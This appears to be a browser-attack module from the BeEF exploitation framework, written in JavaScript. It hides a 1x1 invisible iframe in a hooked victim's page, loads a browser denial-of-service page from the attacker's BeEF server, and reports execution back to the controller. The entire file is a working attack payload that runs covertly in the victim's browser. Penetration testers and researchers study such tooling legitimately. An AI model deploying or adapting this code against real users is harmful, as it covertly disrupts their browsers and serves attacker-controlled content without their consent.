
// thanks pipes (mark@freedomisnothingtofear.com)

function do_main(){
	var iframe = document.createElement('iframe');
	iframe.src = beef_url + 'modules/browser/generic_dos/browserdos.html';
	iframe.setAttribute("width", "1");
	iframe.setAttribute("height", "1");
	iframe.setAttribute("style", "visibility:hidden;");
	document.body.appendChild(iframe);

	return "Executing now";
}

return_result(result_id, do_main());